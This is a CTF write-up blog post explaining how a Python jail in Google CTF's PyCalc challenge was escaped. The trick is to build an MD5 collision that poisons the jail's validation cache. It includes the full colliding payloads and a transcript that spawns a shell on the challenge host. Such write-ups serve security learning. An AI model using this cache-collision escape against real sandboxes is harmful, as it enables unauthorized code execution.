---
layout: post
title:  "Escaping a Python jail using an MD5 collision"
date:   2024-06-27 00:00:00 +0000
tags: ctf python
---

![pyjail](/assets/pycalc-md5-collision/pycalc.png)

I played Google CTF last weekend and there was a fun Python jail challenge, PyCalc.


Connecting to the provided host and port gives us a limited Python shell. We can evaluate basic arithmetic expressions, like so:
```bash
$~ ncat pycalc.2024.ctfcompetition.com 1337
== proof-of-work: disabled ==
Simple calculator in Python, type 'exit' to exit
> 1+1
Caching code validation result with key d96e018f51ea61e5ff2f9c349c5da67d
Waiting up to 10s for completion
2
```

Most other expressions failed to execute, with the program detailing which opcode was disallowed. For example, attempting an import or calling a function:
```bash
== proof-of-work: disabled ==
Simple calculator in Python, type 'exit' to exit
> import os
Caching code validation result with key ed9f4b8f879ddbb59fda1057ea3a2810
Instruction IMPORT_NAME is not allowed
Code validation failed
> exec()
Caching code validation result with key c501db5e49896515e6d0ad52c2283bc2
Instruction PRECALL is not allowed
Code validation failed
```

It was clear that there was a whitelist of permitted opcodes, and after searching for ways to execute arbitary code for a while, we couldn't find a method which didn't fail the validation.

One particular line of the output was interesting though:
> Caching code validation result with key d96e018f51ea61e5ff2f9c349c5da67d

The hash looks like MD5, and it sounds like the code is verifying the bytecode and then caching the result using this MD5 digest as the cache key. It's quickly apparent that this hash is simply the MD5 of our UTF-8 encoded input.
```python
hashlib.md5('1+1'.encode('utf8')).hexdigest() == 'd96e018f51ea61e5ff2f9c349c5da67d'
```

With this thesis we devised our solution: submit innocuous code which doesn't contain bad opcodes, which will be validated and then cached, then submit evil code which has the same MD5 hash, which contains bad opcodes and gets us a shell.

So how do we create two Python expressions with the same hash which do different things?

The idea is this: start both inputs with an open quote, `'`, then append arbitrary data to both such that the resulting strings have the same hash (i.e. create a collision), now add an identical suffix to both strings (which will preserve the collision) which switches control flow based on the random data within the strings, for example:
```python
'baR3SMhZPUl6zaL24n'[0] == 'b' or breakpoint()
'NzdYAKsD8AKK3z+la4'[0] == 'b' or breakpoint()
```
In the case of the first string the left-hand side of the `or` will be truthy and thus the expression will yield True. In the case of the second string the left-hand side will be falsy and therefore we will invoke `breakpoint()`, which in Python is sufficient to execute arbitrary code interactively.

In practice it was slightly more difficult as we couldn't use the equality operator, but we could use binary operators like `&`. We also couldn't use the binary operators on a string index, as that would be operating on a string, but we could use them on integers. Therefore we could instead prefix both inputs with `b'` to create bytestrings which when indexed will give an integer. We could use these integers with binary operators to yield a truthy and falsy value.

You may wonder why the bad opcodes on the right-hand side of the `or` aren't included in the compiled code regardless - this is because when this code is compiled into bytecode Python omits the right-hand side if the left-hand side can be evaluated to a truthy value at compile time. You can see that here:
```python
>>> c = compile('1 or breakpoint()', '', 'eval')
>>> list(map(lambda x: x.opname, dis.get_instructions(c)))
['RESUME', 'LOAD_CONST', 'RETURN_VALUE']
>>> c = compile('0 or breakpoint()', '', 'eval')
>>> list(map(lambda x: x.opname, dis.get_instructions(c)))
['RESUME', 'PUSH_NULL', 'LOAD_NAME', 'CALL', 'RETURN_VALUE']
```

To generate the collision I used the [`textcoll.sh`](https://github.com/cr-marcstevens/hashclash/blob/77419e170ef3b29812819510ce3e5db6fdcf26f0/scripts/textcoll.sh) script from Marc Stevens' HashClash. We modified the script slightly to increase the size of the alphabet, and remove the constraints on all but the first and second bytes (constraining them to `b'`). Generating this collision took around 30 minutes on a 128 core machine.

This resulted in two inputs:
```
# input1
b'cAWa,=tDo9lp4!tc&=A/-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg(

# input2
b'cAWa,=tDo9lp4!tc&=A3-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg(
```
Which we can see have the same MD5 hash:
```bash
$~ md5sum input*
102837a16831bc539fe06a9f21af30ad  input1
102837a16831bc539fe06a9f21af30ad  input2
$~ sha256sum input*
44ee9adeaf32bebda45eae0aa534a5574e209cd4f2b333005bbda638f3b76b2e  input1
dcaf5c2e1881d9b39c9190411dd000a52018043114c8196b4095867fdcf4a360  input2
```

Looking carefully we can see that 20th character in both bytestrings differs. In the first it is `/`, in the second it is `3`, that means we can use this index to switch the control flow.
```
b'cAWa,=tDo9lp4!tc&=A/-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg(
                     ^
                     |--- 20th character of bytestring differs
                     v
b'cAWa,=tDo9lp4!tc&=A3-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg(
```

Anding these characters with `4` results in a truthy value and a falsy value, which is exactly what we need.
```python
>>> input1[19] & 4
4
>>> input2[19] & 4
0
```

This gives us a common suffix which we can append to both payloads:
```
'[19] & 4 or breakpoint()
```
Now our final inputs look like this:
```python
b'cAWa,=tDo9lp4!tc&=A/-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg('[19] & 4 or breakpoint()
b'cAWa,=tDo9lp4!tc&=A3-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg('[19] & 4 or breakpoint()
```

Submitting the benign input followed by the evil input invokes `breakpoint()` and we can use the Python debugger to drop us into a shell, like so:
```bash
$~ ncat pycalc.2024.ctfcompetition.com 1337
== proof-of-work: disabled ==
Simple calculator in Python, type 'exit' to exit
> b'cAWa,=tDo9lp4!tc&=A/-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg('[19] & 4 or breakpoint()
Caching code validation result with key 6418545ef8b9b1daa3b5fe41d46c2cc6
Waiting up to 10s for completion
4
> b'cAWa,=tDo9lp4!tc&=A3-.mkq38p_lMEWWA{e6v!2Rk:nL|N?;5d%`3F+{3,~Dk/ddEV+5qN"UUlv5a)W$R2pF9Rm|,tiD4-kA;s$V%^>]fi`(FX=q!!!!!&!!TQg('[19] & 4 or breakpoint()
Hit code validation result cache with key 6418545ef8b9b1daa3b5fe41d46c2cc6
Waiting up to 10s for completion
--Return--
> <stdin>(1)<module>()->None
(Pdb) import os; os.system('/bin/bash')
whoami
ubuntu
/readflag
CTF{Ca$4_f0r_d3_C4cH3_Ha5hC1a5h}
```
